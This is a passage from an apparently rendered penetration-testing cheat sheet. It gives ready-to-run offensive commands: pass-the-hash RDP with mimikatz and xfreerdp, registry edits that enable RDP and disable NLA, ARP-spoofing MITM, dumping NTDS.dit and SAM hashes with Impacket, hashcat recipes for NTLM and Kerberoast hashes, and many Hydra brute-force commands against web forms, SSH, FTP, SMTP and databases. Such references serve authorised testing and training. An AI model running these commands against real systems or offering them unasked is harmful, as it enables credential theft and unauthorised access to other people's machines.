<h3 id="file-formats"><a class="header" href="#file-formats">File Formats</a></h3>
<pre><code>
# An Extensibe Storage Engine format implementation. Allows dumping catalog, 
# pages and tables of ESE databases (e.g. NTDS.dit)
esentutl.py databaseFile {dump,info,export}

# NTFS format implementation. This script provides a mini shell for 
# browsing and extracting an NTFS volume, including hidden/locked contents.
ntfs-read.py /dev/disk1
ntfs-read.py "\C:"
ntfs-read.py "\C:" -extract "\windows\system32\config\sam"

# A Windwows Registry file format implementation. It allows to parse offline registry hives.
registry-read.py registryHive enum_key,enum_values,get_value,get_class,walk}


</code></pre>
<h3 id="others"><a class="header" href="#others">Others</a></h3>
<pre><code>
# This script will gather data about the domain's users and their corresponding email addresses.
GetADUsers.py domain/user:password@IP

# Simple MQTT example aimed at playing with different login options.
mqtt_check.py domain/user:password@IP
mqtt_check.py domain/user:password@IP -ssl

# [MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth.
# This example test whether an account is valid on the target host.
rdp_check.py domain/user:password@IP
rdp_check.py domain/user@IP -hashes LMHASH:NTHASH

# Simple packet sniffer that uses a raw socket to listen for packets 
# in transit corresponding to the specified protocols.
sniffer.py {tcp, udp, icmp}

# Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.
ping.py &lt;src-ip&gt; &lt;dst-ip&gt;

# Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.
ping6.py &lt;src-ip&gt; &lt;dst-ip&gt;


</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h3 id="remote-and-auto"><a class="header" href="#remote-and-auto">Remote and Auto</a></h3>
<pre><code># Remotely enable RDP using CrackMapExec
sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable

# RDP through Pass-the-Hash
xfreerdp /u:USER /d:DOMAIN /pth:NTLM /v:server.domain.local

# RDP using mimikatz and PtH
sekurlsa::pth /user:user /domain:domain.local /ntlm:xxxxxxxxxxxxxxx /run:"mstsc.exe /restrictedadmin"

</code></pre>
<h3 id="cmdexe"><a class="header" href="#cmdexe">cmd.exe</a></h3>
<pre><code># Enable RDP from cmd.exe
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable RDP from cmd.exe
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f

# Disable NLA (Network Layer Authentication) requirement
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# You can also do it through the firewall
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable


</code></pre>
<h3 id="powershell-2"><a class="header" href="#powershell-2">Powershell</a></h3>
<pre><code># Requires admin privileges or being able to run as sudo (using powershell sudo.ps1)
powershell -ExecutionPolicy ByPass -command "&amp; { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }"

</code></pre>
<h3 id="man-in-the-middle"><a class="header" href="#man-in-the-middle">Man in The Middle</a></h3>
<pre><code># You can try to attack existing RDP connections
# seth.sh is a great tool for that
# It performs an ARP spoofing attack
./seth.sh eth0 &lt;IP attacker&gt; &lt;IP victim&gt; &lt;Gateway | Host&gt;

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="hashcat-cheatsheet"><a class="header" href="#hashcat-cheatsheet">Hashcat-Cheatsheet</a></h2>
<ul>
<li><a href="https://hashcat.net/wiki/doku.php?id=hashcat">Hashcat wiki</a></li>
<li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat examples</a></li>
<li><a href="http://openwall.info/wiki/john/sample-hashes">Sample Hashes</a></li>
</ul>
<h3 id="identify-hashes"><a class="header" href="#identify-hashes">Identify Hashes</a></h3>
<p><code>hash-identifier</code></p>
<h3 id="max-power"><a class="header" href="#max-power">MAX POWER!</a></h3>
<p>I have found that I can squeeze some more power out of my hash cracking by adding these parameters:</p>
<pre><code>--force -O -w 4 --opencl-device-types 1,2
</code></pre>
<p>These will force Hashcat to use the CUDA GPU interface which is buggy but provides more performance (–force) , will Optimize for 32 characters or less passwords (-O) and will set the workload to "Insane" (-w 4) which is supposed to make your computer effectively unusable during the cracking process.
Finally "--opencl-device-types 1,2 " will force HashCat to use BOTH the GPU and the CPU to handle the cracking.</p>
<h3 id="using-hashcat-and-a-dictionary"><a class="header" href="#using-hashcat-and-a-dictionary">Using hashcat and a dictionary</a></h3>
<p>Create a .hash file with all the hashes you want to crack puthasheshere.hash: $1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/</p>
<p>Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:</p>
<p><code>hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt</code></p>
<p>Hashcat example cracking Wordpress passwords using rockyou:<br />
<code>hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt</code></p>
<h3 id="hashcat-one-rule-to-rule-them-all"><a class="header" href="#hashcat-one-rule-to-rule-them-all">HashCat One Rule to Rule them All</a></h3>
<p>Not So Secure has built a custom rule that I have had luck with in the past:<br />
<a href="https://www.notsosecure.com/one-rule-to-rule-them-all/">Custom Rules</a>
The rule can be downloaded from their Github site:<br />
<a href="https://github.com/NotSoSecure/password_cracking_rules">Github Link</a></p>
<p>I typically drop OneRuleToRuleThemAll.rule into the rules subfolder and run it like this from my windows box (based on the notsosecure article):</p>
<pre><code>hashcat64.exe --force -m300 --status -w3 -o found.txt --remove --potfile-disable -r rules\OneRuleToRuleThemAll.rule hash.txt rockyou.txt
</code></pre>
<h3 id="using-hashcat-bruteforcing"><a class="header" href="#using-hashcat-bruteforcing">Using hashcat bruteforcing</a></h3>
<pre><code>predefined charsets
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?s = «space»!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
?a = ?l?u?d?s
?b = 0x00 - 0xff
</code></pre>
<p>?l?d?u is the same as:<br />
?ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789</p>
<p>Brute force all passwords length 1-8 with possible characters A-Z a-z 0-9<br />
<code>hashcat64 -m 500 hashes.txt -a  3  ?1?1?1?1?1?1?1?1 --increment -1 ?l?d?u</code></p>
<h3 id="cracking-linux-hashes---etcshadow-file"><a class="header" href="#cracking-linux-hashes---etcshadow-file">Cracking Linux Hashes - /etc/shadow file</a></h3>
<div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th><th>Type</th></tr></thead><tbody>
<tr><td>500</td><td>md5crypt $1$, MD5(Unix)</td><td>Operating-Systems</td></tr>
<tr><td>200</td><td>bcrypt $2*$, Blowfish(Unix)</td><td>Operating-Systems</td></tr>
<tr><td>400</td><td>sha256crypt $5$, SHA256(Unix)</td><td>Operating-Systems</td></tr>
<tr><td>1800</td><td>sha512crypt $6$, SHA512(Unix)</td><td>Operating-Systems</td></tr>
</tbody></table>
</div>
<h3 id="cracking-windows-hashes"><a class="header" href="#cracking-windows-hashes">Cracking Windows Hashes</a></h3>
<div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th><th>Type</th></tr></thead><tbody>
<tr><td>3000</td><td>LM</td><td>Operating-Systems</td></tr>
<tr><td>1000</td><td>NTLM</td><td>Operating-Systems</td></tr>
</tbody></table>
</div>
<h3 id="cracking-common-application-hashes"><a class="header" href="#cracking-common-application-hashes">Cracking Common Application Hashes</a></h3>
<div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th><th>Type</th></tr></thead><tbody>
<tr><td>900</td><td>MD4</td><td>Raw Hash</td></tr>
<tr><td>0</td><td>MD5</td><td>Raw Hash</td></tr>
<tr><td>5100</td><td>Half MD5</td><td>Raw Hash</td></tr>
<tr><td>100</td><td>SHA1</td><td>Raw Hash</td></tr>
<tr><td>10800</td><td>SHA-384</td><td>Raw Hash</td></tr>
<tr><td>1400</td><td>SHA-256</td><td>Raw Hash</td></tr>
<tr><td>1700</td><td>SHA-512</td><td>Raw Hash</td></tr>
</tbody></table>
</div>
<h3 id="cracking-common-file-password-protections"><a class="header" href="#cracking-common-file-password-protections">Cracking Common File Password Protections</a></h3>
<div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th><th>Type</th></tr></thead><tbody>
<tr><td>11600</td><td>7-Zip</td><td>Archives</td></tr>
<tr><td>12500</td><td>RAR3-hp</td><td>Archives</td></tr>
<tr><td>13000</td><td>RAR5</td><td>Archives</td></tr>
<tr><td>13200</td><td>AxCrypt</td><td>Archives</td></tr>
<tr><td>13300</td><td>AxCrypt in-memory SHA1</td><td>Archives</td></tr>
<tr><td>13600</td><td>WinZip</td><td>Archives</td></tr>
<tr><td>9700</td><td>MS Office &lt;= 2003 $0/$1, MD5 + RC4</td><td>Documents</td></tr>
<tr><td>9710</td><td>MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #1</td><td>Documents</td></tr>
<tr><td>9720</td><td>MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #2</td><td>Documents</td></tr>
<tr><td>9800</td><td>MS Office &lt;= 2003 $3/$4, SHA1 + RC4</td><td>Documents</td></tr>
<tr><td>9810</td><td>MS Office &lt;= 2003 $3, SHA1 + RC4, collider #1</td><td>Documents</td></tr>
<tr><td>9820</td><td>MS Office &lt;= 2003 $3, SHA1 + RC4, collider #2</td><td>Documents</td></tr>
<tr><td>9400</td><td>MS Office 2007</td><td>Documents</td></tr>
<tr><td>9500</td><td>MS Office 2010</td><td>Documents</td></tr>
<tr><td>9600</td><td>MS Office 2013</td><td>Documents</td></tr>
<tr><td>10400</td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4)</td><td>Documents</td></tr>
<tr><td>10410</td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1</td><td>Documents</td></tr>
<tr><td>10420</td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2</td><td>Documents</td></tr>
<tr><td>10500</td><td>PDF 1.4 - 1.6 (Acrobat 5 - 8)</td><td>Documents</td></tr>
<tr><td>10600</td><td>PDF 1.7 Level 3 (Acrobat 9)</td><td>Documents</td></tr>
<tr><td>10700</td><td>PDF 1.7 Level 8 (Acrobat 10 - 11)</td><td>Documents</td></tr>
<tr><td>16200</td><td>Apple Secure Notes</td><td>Documents</td></tr>
</tbody></table>
</div>
<h3 id="cracking-common-database-hash-formats"><a class="header" href="#cracking-common-database-hash-formats">Cracking Common Database Hash Formats</a></h3>
<div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th><th>Type</th><th>Example Hash</th></tr></thead><tbody>
<tr><td>12</td><td>PostgreSQL</td><td>Database Server</td><td>a6343a68d964ca596d9752250d54bb8a:postgres</td></tr>
<tr><td>131</td><td>MSSQL (2000)</td><td>Database Server</td><td>0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578</td></tr>
<tr><td>132</td><td>MSSQL (2005)</td><td>Database Server</td><td>0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe</td></tr>
<tr><td>1731</td><td>MSSQL (2012, 2014)</td><td>Database Server</td><td>0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375</td></tr>
<tr><td>200</td><td>MySQL323</td><td>Database Server</td><td>7196759210defdc0</td></tr>
<tr><td>300</td><td>MySQL4.1/MySQL5</td><td>Database Server</td><td>fcf7c1b8749cf99d88e5f34271d636178fb5d130</td></tr>
<tr><td>3100</td><td>Oracle H: Type (Oracle 7+)</td><td>Database Server</td><td>7A963A529D2E3229:3682427524</td></tr>
<tr><td>112</td><td>Oracle S: Type (Oracle 11+)</td><td>Database Server</td><td>ac5f1e62d21fd0529428b84d42e8955b04966703:38445748184477378130</td></tr>
<tr><td>12300</td><td>Oracle T: Type (Oracle 12+)</td><td>Database Server</td><td>78281A9C0CF626BD05EFC4F41B515B61D6C4D95A250CD4A605CA0EF97168D670EBCB5673B6F5A2FB9CC4E0C0101E659C0C4E3B9B3BEDA846CD15508E88685A2334141655046766111066420254008225</td></tr>
<tr><td>8000</td><td>Sybase ASE</td><td>Database Server</td><td>0xc00778168388631428230545ed2c976790af96768afa0806fe6c0da3b28f3e132137eac56f9bad027ea2</td></tr>
</tbody></table>
</div>
<h3 id="cracking-ntlm-hashes"><a class="header" href="#cracking-ntlm-hashes">Cracking NTLM hashes</a></h3>
<p>After grabbing or dumping the NTDS.dit and SYSTEM registry hive or dumping LSASS memory from a Windows box, you will often end up with NTLM hashes.</p>
<div class="table-wrapper"><table><thead><tr><th>Path</th><th>Description</th></tr></thead><tbody>
<tr><td>C:\Windows\NTDS\ntds.dit</td><td>Active Directory database</td></tr>
<tr><td>C:\Windows\System32\config\SYSTEM</td><td>Registry hive containing the key used to encrypt hashes</td></tr>
</tbody></table>
</div>
<p>And using Impacket to dump the hashes</p>
<pre><code>impacket-secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
</code></pre>
<p>You can crack the NTLM hash dump usign the following hashcat syntax:</p>
<pre><code>hashcat64 -m 1000 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\hashsample.hash "d:\WORDLISTS\realuniq.lst" -r OneRuleToRuleThemAll.rule
</code></pre>
<p><em>Benchmark using a Nvidia 2060 GTX:</em>
Speed: 7000 MH/s
Recovery Rate: 12.47%
Elapsed Time: 2 Hours 35 Minutes</p>
<h3 id="cracking-hashes-from-kerboroasting---krb5tgs"><a class="header" href="#cracking-hashes-from-kerboroasting---krb5tgs">Cracking Hashes from Kerboroasting - KRB5TGS</a></h3>
<p>A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name.
KRB5TGS - Kerberoasting Service Accounts that use SPN Once you have identified a Kerberoastable service account (Bloodhound? Powershell Empire? - likely a MS SQL Server Service Account), any AD user can request a krb5tgs hash from it which can be used to crack the password.</p>
<p>Based on my benchmarking, KRB5TGS cracking is 28 times slower than NTLM.</p>
<p>Hashcat supports multiple versions of the KRB5TGS hash which can easily be identified by the number between the dollar signs in the hash itself.</p>
<ul>
<li>13100 - Type 23       - $krb5tgs$23$</li>
<li>19600 - Type 17       - $krb5tgs$17$</li>
<li>19700 - Type 18       - $krb5tgs$18$</li>
<li>18200 - ASREP Type 23 - $krb5asrep$23$</li>
</ul>
<p>KRB5TGS Type 23 - Crackstation humans only word list with OneRuleToRuleThemAll mutations rule list.</p>
<pre><code>hashcat64 -m 13100 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\krb5tgs.hash d:\WORDLISTS\realhuman_phill.txt -r OneRuleToRuleThemAll.rule	
</code></pre>
<p><em>Benchmark using a Nvidia 2060 GTX:</em>
Speed: 250 MH/s
Elapsed Time: 9 Minutes</p>
<h3 id="cracking-ntlmv2-hashes-from-a-packet-capture"><a class="header" href="#cracking-ntlmv2-hashes-from-a-packet-capture">Cracking NTLMv2 Hashes from a Packet Capture</a></h3>
<p>You may be asked to recover a password from an SMB authentication (NTLMv2) from a Packet Capture.
The following is a 9-step process for formatting the hash correctly to do this.
<a href="https://research.801labs.org/cracking-an-ntlmv2-hash/">9-step Process</a></p>
<h3 id="to-crack-linux-hashes-you-must-first-unshadow-them"><a class="header" href="#to-crack-linux-hashes-you-must-first-unshadow-them">To crack linux hashes you must first unshadow them</a></h3>
<p><code>unshadow passwd-file.txt shadow-file.txt</code></p>
<p><code>unshadow passwd-file.txt shadow-file.txt &gt; unshadowed.txt</code></p>
<h3 id="crack-a-zip-password"><a class="header" href="#crack-a-zip-password">Crack a zip password</a></h3>
<p><code>zip2john Zipfile.zip | cut -d ':' -f 2 &gt; hashes.txt</code><br />
<code>hashcat -a 0 -m 13600 hashes.txt /usr/share/wordlists/rockyou.txt</code></p>
<p>Hashcat appears to have issues with some zip hash formats generated from zip2john.  You can fix this by editing the zip hash contents to align with the example zip hash format found on the hash cat example page:
<code>$zip2$*0*3*0*b5d2b7bf57ad5e86a55c400509c672bd*d218*0**ca3d736d03a34165cfa9*$/zip2$</code></p>
<p>John seems to accept a wider range of zip formats for cracking.</p>
<h3 id="prince-password-generation"><a class="header" href="#prince-password-generation">PRINCE Password Generation</a></h3>
<p>PRINCE (PRobability INfinite Chained Elements) is a hashcat utility for randomly generating probable passwords:</p>
<pre><code>pp64.bin --pw-min=8 &lt; dict.txt | head -20 shuf dict.txt | pp64.bin --pw-min=8 | head -20
</code></pre>
<p>Reference:<br />
<a href="https://github.com/hashcat/princeprocessor">Prince Reference</a></p>
<h3 id="purple-rain"><a class="header" href="#purple-rain">Purple Rain</a></h3>
<p>Purple Rain attack uses a combination of Prince, a dictionary and random Mutation rules to dynamicaly create infinite combinations of passwords.</p>
<pre><code>shuf dict.txt | pp64.bin --pw-min=8 | hashcat -a 0 -m #type -w 4 -O hashes.txt -g 300000
</code></pre>
<p>Reference:<br />
<a href="https://www.netmux.com/blog/purple-rain-attack">Rain Reference</a></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="hydra-notes"><a class="header" href="#hydra-notes">Hydra notes</a></h2>
<ul>
<li><a href="https://medium.com/@joshthedev/step-10-login-brute-forcing-e709b4b60637">Hydra Medium Article</a></li>
</ul>
<p>Hydra is a very useful software when it comes to bruteforce credentials on most commonly used protocols. We are going to start with some flags which are generally used independently from the protocol, so in the examples when we will see these flags, we can immediately understand what they are used for. Here is a list of common and general flags used with Hydra:</p>
<ul>
<li><code>-L &lt;filepath&gt;</code> for the file path to use for usernames, separated by newlines</li>
<li><code>-P &lt;filepath&gt;</code> for the file path to use for passwords, separated by newlines</li>
<li><code>-C &lt;filepath&gt;</code> this is an alternative to -L and -P, since we can provide a unique file which contains both user and password, separated by a colon, like user1:passwdrandom user2:minestrone root:toor ...</li>
<li><code>-t &lt;integer&gt;</code> is the number of threads to use</li>
<li><code>-o &lt;filepath&gt;</code> allows us to specify an output file where to save results</li>
<li><code>-w &lt;integer&gt;</code> specifies the amount of seconds two wait between consecutive requests</li>
<li><code>-s &lt;integer&gt;</code> specifies the port number to use</li>
<li><code>-v</code> activates the verbose mode, to give us an idea of what is happening behind the scenes, so we will see each attempt, and the current combination of credentials which is being tested</li>
<li><code>-S</code> performs a connection using SSL</li>
<li><code>-l &lt;username&gt;</code> uses a single user for login instead of a list/file, so we can specify instead of -L a single user with <code>-l root</code> or <code>-l usrname1</code></li>
<li><code>-M &lt;filepath&gt;</code> with this option we can specify a file which will contain on each line a different IP or website or resource, in order to perform parallel cracking</li>
<li><code>-f</code> this flag when activated, will let hydra terminate as soon as it finds a single correct credential pair, so as soon as it succeeds it exits, this happens per host if we specify -M (so a set of machines)</li>
<li><code>-F</code> exits after the first found login/password pair for any host (for usage with -M)</li>
</ul>
<h3 id="http"><a class="header" href="#http">HTTP</a></h3>
<h3 id="http-basic-authentication"><a class="header" href="#http-basic-authentication">HTTP Basic Authentication</a></h3>
<p>We can use the following commands for Basic HTTP Authentication, we can understand that the authentication is basic from the headers of the response.</p>
<pre><code class="language-shell">hydra -L users.txt -P words.txt www.site.com http-head /private/
# we provide users.txt as files containing users
# then words.txt as the password file and then we try
# a basic http authentication by using the http-head parameter
# then we provide the page /private/ which is the url path
# where we are asked for credentials
</code></pre>
<p>We can add with -e combinations to the already existing combinations provided from the users and password files in particular we can use <code>n</code> or <code>s</code> or <code>r</code> or all the combinations of them, their meaning is:</p>
<ul>
<li><code>n</code> adds for each user also the null password</li>
<li><code>s</code> adds the combination of credentials username/username for each of the usernames</li>
<li><code>r</code> adds for each combination username/password also the reversed password/username</li>
</ul>
<pre><code class="language-shell">hydra -L users.txt -P words.txt www.site.com -e ns http-head /private/
# here we do the same thing as before, but we add combinations with
# `-e ns`, so we are also trying with an empty password for each
# of the users and with passwords equal to the username for each user
</code></pre>
<h3 id="http-digest-authentication"><a class="header" href="#http-digest-authentication">HTTP Digest Authentication</a></h3>
<pre><code class="language-shell">hydra -l root -P test.txt -vV localhost http-get /forbidden-d2
# uses the username root with passwords from the file called test.txt
# it runs in verbose mode on localhost through http-get module we specify
# that this is an HTTP digest authentication found at path /forbidden-d2
</code></pre>
<pre><code class="language-shell">hydra -l admin -P 1000_common_passwords.txt -s 8090 -f 192.168.1.4 http-get /get_camera_params.cgi
# uses the username admin with passwords from the file called
# 1000_common_passwords.txt it runs on port 8090 through 
# the -f flag it will stop as soon as it finds the first valid credentials
# the http-get module is specified to denote the presence of an HTTP digest
# authentication at the path /get_camera_params.cgi
</code></pre>
<h3 id="http-forms"><a class="header" href="#http-forms">HTTP Forms</a></h3>
<p>When it comes to HTTP login forms, we generally have to inspect the web application, searching for messages which will appear on successful or failed logins.</p>
<p>Generally for HTTP forms we will have hydra commands with the following structure:</p>
<pre><code class="language-shell">hydra -L &lt;users_file&gt; -P &lt;password_file&gt; &lt;url&gt; http[s]-[post|get]-form \
"index.php:param1=value1&amp;param2=value2&amp;user=^USER^&amp;pwd=^PASS^&amp;paramn=valn:[F|S]=messageshowed"
</code></pre>
<p>Where depending on the webpage and on the post we can have after url:</p>
<ul>
<li>http-get-form, in case of an http page with a get form</li>
<li>https-get-form, in case of an https page with a get form</li>
<li>http-post-form, in case of an http page with a post form</li>
<li>https-post-form, in case of an https page with a post form</li>
</ul>
<p>and after this a string we specify the "request string" which will contain the following elements separated by a colon <code>:</code>:</p>
<ul>
<li>pageOnWhichTheLoginHappens</li>
<li>list of parameters, here we have to specify with ^USER^ and ^PASS^ where usernames and passwords will be inserted</li>
<li>a character which may be F (for failing strings) or S for successful strings followed by an equal sign <code>=</code> and a string which appears in a failed attempt or in a successful attempt, if we do not specify F or S, F is the default also because this is the more natural option, we generally know which strings will appear when we fail a login but not the ones which will appear when it is successful (unless we are dealing with a known web technology/framework). Let's see some examples, We can specify a failure string with <code>:F=mystringincaseoffailure</code> while we can specify a success string with <code>:S=mystringincaseofsuccess</code>. But we may also see online <code>:mystring</code> and it will be the equivalent of <code>:F=mystring</code></li>
</ul>
<p>Let's see some warmup examples:</p>
<pre><code class="language-shell">hydra -l admin -P pass.txt https://url.com https-post-form "index.php:param1=value123&amp;user=^USER^&amp;pass=^PASS^:F=Bad login"
 # in this example we are in an https post form situation, 
 # as we may notice as request line we have the following structure
 # page:parameters:F=message_to_show_in_case_of_failure
</code></pre>
<pre><code class="language-shell">hydra -l admin -P pass.txt https://url.com https-post-form "index.php:param1=value123&amp;user=^USER^&amp;pass=^PASS^:S=Success!!"
 # in this example we are in an https post form situation, 
 # as we may notice as request line we have the following structure
 # page:parameters:S=message_to_show_in_case_of_failure
</code></pre>
<h3 id="http-get-login-forms"><a class="header" href="#http-get-login-forms">HTTP Get Login Forms</a></h3>
<pre><code class="language-shell">hydra -l admin -P /root/Desktop/wordlists/test.txt http://www.website.com \
http-get-form "/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect."
</code></pre>
<pre><code class="language-shell">hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists/Passwords/rockyou-40.txt \
  -e ns  -F  -u  -t 1  -w 10  -v  -V  192.168.1.44  http-get-form \
"/DVWA/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
</code></pre>
<h3 id="http-post-login-forms"><a class="header" href="#http-post-login-forms">HTTP Post Login Forms</a></h3>
<pre><code class="language-shell">hydra 192.168.1.69 http-post-form "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&amp;pass=^PASS^:Bad login" \
-L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
# Here we specified:
 # Host = 192.168.1.69
 # Method = http-form-post
 # URL = /w3af/bruteforce/form_login/dataReceptor.php
 # Form parameters = user=^USER^&amp;pass=^PASS^
 # Failure response = Bad login
 # Users file = users.txt
 # Password file = pass.txt
 # Threads = -t 10
 # Wait for timeout = -w 30
 # Output file = -o hydra-http-post-attack.txt
</code></pre>
<p>We can make more complicated examples, for example by specifying specific headers or cookies with:</p>
<pre><code class="language-shell">hydra 192.168.1.69 http-post-form "/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H=X-Foo: Foo" \
-L users.txt -P pass.txt -t 10 -w 1 -o hydra-http-post-attack.txt
 # in this case we specify that the cookie should be page/cookie
 # cookies can be specified with C=
 # and we also added an header with H= 
 # this header is called X-Foo and has as value Foo
</code></pre>
<pre><code class="language-shell">hydra -L users.txt -P words.txt https://www.site.com  https-post-form "/index.cgi:login&amp;name=^USER^&amp;password=^PASS^&amp;login=Login:Not allowed" &amp;
 # here we use https-post-form, since the website uses https
</code></pre>
<pre><code class="language-shell">hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location'
# now we check for success by using S=Location, since wordpress uses a Location
# header to redirect the user, we can think about S as a sort of grep applied to
# the HTTP response
</code></pre>
<h3 id="smtp"><a class="header" href="#smtp">SMTP</a></h3>
<pre><code class="language-shell">hydra smtp.victimsemailserver.com smtp -l useraccount@gmail.com -P '/root/Desktop/rockyou.txt' -s portnumber -S -v 
</code></pre>
<p>Generally the port used for SMTP is 465 and common SMTP server for common email services are: * smtp.mail.yahoo.com * smtp.gmail.com * smtp.live.com (but on poort 587)</p>
<h3 id="telnet"><a class="header" href="#telnet">Telnet</a></h3>
<pre><code class="language-shell">hydra -l &lt;username&gt; -P &lt;password_file&gt; telnet://targetname
</code></pre>
<h3 id="ssh"><a class="header" href="#ssh">SSH</a></h3>
<pre><code class="language-shell">hydra -l root -M /path/to/ip/list.txt -P /path/to/passwordlist.txt ssh -t 4
</code></pre>
<p>Notice that with some services, we may need to use the recommended number of tasks. In case of SSH if we use more than 4 tasks we may get errors.</p>
<pre><code class="language-shell">hydra 192.168.1.26 ssh2 -s 22 -P pass.txt -L users.txt -e ns -t 10
 # this will attack the system 192.168.1.26 on port 22
 # and will use as password file pass.txt while
 # for users the file users.txt
 # the process will use 10 threads at a time
</code></pre>
<pre><code class="language-shell">hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123
</code></pre>
<pre><code class="language-shell">hydra -L logins.txt -P pws.txt -M targets.txt ssh
# tries the users from logins.txt and the paasswords from pws.txt
# on all the machines listed on targests.txt on the ssh port/service
</code></pre>
<h3 id="ftp-1"><a class="header" href="#ftp-1">FTP</a></h3>
<pre><code class="language-shell">hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ftp
</code></pre>
<pre><code class="language-shell">hydra -l user -P passlist.txt ftp://192.168.0.1
</code></pre>
<h3 id="mysql-and-other-databases"><a class="header" href="#mysql-and-other-databases">MySQL and other databases</a></h3>
<p>We can use hydra with many kinds of databases, anyway it is very important for us to check that we have installed hydra with the adequate module to perform a specific bruteforce.</p>
<p><strong>IMPORTANT</strong>: if we did not install hydra with mysql5 support it will not work, we can check the modules available by issuing a <code>hydra -h</code>, if we just see <code>mysql(v4)</code> this means that our version will not be compatible with <code>mysql5</code>, while if we see <code>mysql</code> then our version of hydra will be compatible also with mysql5 databases.</p>
<pre><code class="language-shell">hydra -L &lt;your_username_file&gt; -P &lt;your_password_file&gt; &lt;IP&gt; mysql -s 3306 -o output.txt
</code></pre>
<p>notice that this is equivalent to:</p>
<pre><code class="language-shell">hydra -L &lt;your_username_file&gt; -P &lt;your_password_file&gt; &lt;IP&gt; mysql -o output.txt
 # by default mysql uses port 3306 so we do not need to specify it,
 # anyway it is fundamental to specify it if the mysql port is different
</code></pre>
<h3 id="appendix-a-sending-hydra-traffic-through-proxy"><a class="header" href="#appendix-a-sending-hydra-traffic-through-proxy">Appendix A: Sending Hydra traffic through Proxy</a></h3>
<p>It is often useful to analyze what we are actually doing with hydra, to this purpose we can send the traffic to an intercepting proxy such as Burp.</p>
<p>To do this, we just have to set an environment variable:</p>
<pre><code class="language-shell">export HYDRA_PROXY=http://127.0.0.1:8080
# or
export HYDRA_PROXY_HTTP=http://127.0.0.1:8080 
</code></pre>
<p>From <code>hydra -v</code> we can indeed read:</p>
<pre><code class="language-shell">Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="bruteforce"><a class="header" href="#bruteforce">Bruteforce</a></h2>
<h3 id="links-4"><a class="header" href="#links-4">Links</a></h3>
<ul>
<li><a href="http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/">HTTP Basic Auth Hydra</a></li>
<li><a href="https://crackstation.net/">CrackStation</a></li>
</ul>
<h3 id="create-wordlist"><a class="header" href="#create-wordlist">Create Wordlist</a></h3>
<h4 id="cewl--hydra"><a class="header" href="#cewl--hydra">Cewl + Hydra</a></h4>
<pre><code># Create a Wordlist of a website and Put the whole path of the website

cewl -w wordlist.txt -d 5 http://&lt;IP&gt;/html5

# Change -l user and pass, post request and Failed request, -s is for port

